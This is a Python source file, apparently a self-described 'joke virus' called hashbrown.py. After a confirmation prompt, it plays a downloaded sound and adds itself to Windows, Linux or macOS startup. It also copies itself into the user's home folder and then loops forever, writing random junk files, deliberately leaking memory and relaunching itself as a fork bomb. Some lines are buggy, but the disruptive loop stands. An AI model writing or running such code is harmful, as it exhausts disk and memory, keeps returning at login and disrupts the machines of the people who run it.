"""
hashbrown.py
category: joke virus
intensity - 3
"""
import os
import random
import gc
#sound module
try:
    import pygame
except ImportError:
    try:
        os.system("python -m pip install pygame")
        import pygame
    except:
        os.system("python3 -m pip install pygame")
        import pygame
import sys
platform = sys.platform
if platform == "win32":
    #get the current user
    userdir = os.getenv("USERPROFILE")
elif platform == "linux":
    userdir = os.getenv("HOME")
elif platform == "darwin":
    userdir = os.getenv("HOME")
try:
    arg = sys.argv[1]
    if arg == "notthemainfunction":
        main = False
    else:
        main = True
except:
    main = True

if main:
    run = input("Are you sure you want to run hashbrown.py? (y/N)")
    if run == "y":
        pass
    else:
        sys.exit()

bloat = []
pygame.mixer.init()
viruspath = os.path.dirname(os.path.realpath(__file__)) #virus folder
virusfile = os.path.realpath(__file__) #virus file
if main:
    try:
        pygame.mixer.music.load(viruspath + "/music/coffin.wav")
    except:
        #download the coffin.wav file from the internet
        #make the music folder
        try:
            os.mkdir(viruspath + "/music")
        except:
            pass
        try:
            os.system("curl -o " + viruspath + "/music/coffin.wav https://raw.githubusercontent.com/LeWolfYT/random-files/main/coffin.wav")
        except:
            pass
        pygame.mixer.music.load(viruspath + "/music/coffin.wav")
    pygame.mixer.music.play()
#add to startup
gc.disable()
def copyvirus(index):
    with open(viruspath + "/virus.py", "r") as f:
        virus = f.read()
    with open(userdir + "/virus"+ str(index) + ".py", "w") as f:
        f.write(virus)
if platform == "win32":
    homedir = os.path.expanduser("~")
    homedir = homedir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        with open(homedir + "\\" + random.randbytes(128) +".bat", "w") as f:
            f.write("@echo off\n")
            f.write("python " + virusfile + " notthemainfunction \n")
    except:
        pass
    #also make copies of the virus file (virus2.py, virus3.py, virus4.py, virus5.py)
elif platform == "linux":
    homedir = os.path.expanduser("~")
    homedir = homedir + "/.config/autostart"
    try:
        with open(homedir + "/" + random.randbytes(128) +".sh", "w") as f:
            f.write("#!/bin/bash\n")
            f.write("python " + virusfile + " notthemainfunction \n")
    except:
        pass
elif platform == "darwin":
    homedir = os.path.expanduser("~")
    homedir = homedir + "/.config/autostart"
    try:
        with open(homedir + "/" + random.randbytes(128) +".sh", "w") as f:
            f.write("#!/bin/bash\n")
            f.write("python " + virusfile + " notthemainfunction \n")
    except:
        pass
else:
    pass

while True:
    #make random files
    for i in range(4):
        try:
            copyvirus(i)
        except:
            pass
    def crash():
        while True:
            try:
                file = open(userdir + "/" + str(random.randbytes(512)) + str(random.randbytes(512)) + ".txt", "w")
                file.write(str(random.randbytes(1024)))
                file.close()
            except:
                pass
            #leak memory
            bloat.append(random.randbytes(1024))
            #start in the background
            if platform == "win32":
                try:
                    os.system("start " + virusfile)
                except:
                    os.system("python " + virusfile)
            elif platform == "linux":
                os.system("python3 " + virusfile)
            elif platform == "darwin":
                os.system("python3 " + virusfile)
    crash()